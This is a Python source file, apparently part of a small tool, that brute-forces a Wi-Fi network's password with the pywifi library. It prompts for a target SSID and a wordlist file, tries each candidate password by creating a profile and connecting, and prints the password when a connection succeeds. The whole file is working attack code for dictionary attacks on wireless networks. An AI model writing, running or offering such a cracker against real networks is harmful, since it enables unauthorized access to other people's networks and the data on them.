import time
import pywifi
from pywifi import const
from bin import Profile
def connect(SSID_arr,wk,timeout):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[wk]
    ssid_num = int(input("输入爆破对象编号->"))
    map=read_map()
    SSID = SSID_arr[ssid_num]
    for line in map:
        payload=line.strip()
        PFL=Profile.create_wifi_profile(SSID,payload)
        iface.remove_all_network_profiles()
        tmp_profile=iface.add_network_profile(PFL)
        iface.connect(tmp_profile)
        time.sleep(timeout)
        print("\033[31m[-]\033[0m",payload)
        if iface.status()==const.IFACE_CONNECTED:
            print("\033[32m[+]\033[0m 成功！密码是：",payload)
            break
    pass

def read_map():
    map=""
    file_path=input("请输入字典文件路径(不带引号)->")
    with open(file_path,"r",encoding="utf-8") as file:
        lines=file.readlines()
    return lines
    pass